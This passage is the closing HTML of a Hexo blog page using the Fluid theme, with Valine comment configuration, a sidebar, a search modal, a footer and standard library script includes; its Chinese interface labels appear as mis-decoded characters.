          {"appId":"s4tVoJPA4mLOJlnbTS9bKQCz-MdYXbMMI","appKey":"2jVxSBuNhzKC1JEOZN2aZTgr","path":"window.location.pathname","placeholder":"è¯´ç‚¹ä»€ä¹ˆ","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>ç›®å½•</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">æœç´¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">å…³é”®è¯</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        æ€»è®¿é—®é‡ 
        <span id="leancloud-site-pv"></span>
         æ¬¡
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        æ€»è®¿å®¢é‡ 
        <span id="leancloud-site-uv"></span>
         äºº
      </span>
    
    

  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>





<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ï¼Œå°†å®ƒä¿æŒåœ¨æœ€åº•éƒ¨ -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">åšå®¢åœ¨å…è®¸ JavaScript è¿è¡Œçš„ç¯å¢ƒä¸‹æµè§ˆæ•ˆæœæ›´ä½³</div>
  </noscript>
</body>
</html>
